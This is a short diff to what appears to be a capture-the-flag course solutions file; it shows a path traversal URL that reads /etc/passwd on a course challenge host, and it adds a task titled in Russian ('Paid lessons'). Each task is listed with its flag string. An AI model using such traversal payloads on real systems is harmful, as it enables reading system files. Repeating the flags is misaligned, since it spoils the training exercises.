@@ -139,3 +139,6 @@ Link to [course](https://course.ugractf.ru)
 
 https://dotted.board.course.ugractf.ru/57666eb99dbbca9b/files.php?page=../../../../etc/passwd
 (`ugra_dot_dot_is_win_9ed3ca85a76c`)
+
+**Задача D. Платные уроки**
+(`ugra_the_future_of_web_is_the_future_of_us_42b0794f2da8`)
